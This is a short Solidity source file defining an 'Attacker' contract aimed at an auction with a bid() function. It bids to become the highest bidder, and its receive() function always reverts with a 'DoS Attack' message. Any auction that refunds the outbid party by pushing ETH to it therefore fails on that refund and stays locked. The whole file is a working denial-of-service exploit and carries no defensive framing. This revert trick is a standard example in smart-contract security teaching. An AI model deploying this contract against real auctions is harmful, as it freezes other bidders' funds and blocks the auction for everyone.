// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IAuction {
    function bid() external payable;
}

contract Attacker {
    // 1. Enter the auction and claim highestBidder
    function attack(address _target) external payable {
        IAuction(_target).bid{value: msg.value}();
    }

    // 2. Reject incoming ETH.
    // When the auction tries to refund this contract, this triggers and reverts.
    receive() external payable {
        revert("DoS Attack: I refuse refunds! Auction is permanently locked.");
    }
}